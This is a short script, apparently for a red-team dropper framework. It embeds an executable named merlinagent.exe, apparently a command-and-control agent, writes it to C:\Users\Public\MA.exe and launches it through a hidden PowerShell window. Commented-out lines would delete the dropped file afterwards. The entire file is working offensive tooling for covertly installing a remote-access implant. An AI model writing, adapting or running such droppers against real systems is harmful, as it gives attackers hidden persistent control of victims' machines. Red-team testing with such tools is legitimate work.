// genesis script

//import:/private/tmp/merlinagent.exe

var hello_world;
var hash;
var fn;

function BeforeDeploy() {
  hello_world = "starting";
  console.log(hello_world);
  return true; 
}

function Deploy() {
  var merlz = Asset("merlinagent.exe");
  hash = MD5(merlz);
  hello_world = "deploying";
  console.log(hello_world);
  var ts = Timestamp();
  fn = "C:\\Users\\Public\\MA.exe";
  WriteFile(fn, merlz);
  ForkExec("powershell", ["-NoLogo", "-WindowStyle", "hidden", fn]);
  hello_world = "deployed";
  return true;
}

function AfterDeploy() {
  //DeleteFile(fn);
  console.log(hello_world);
  //Exec("exit", [""]);
  return true;
}
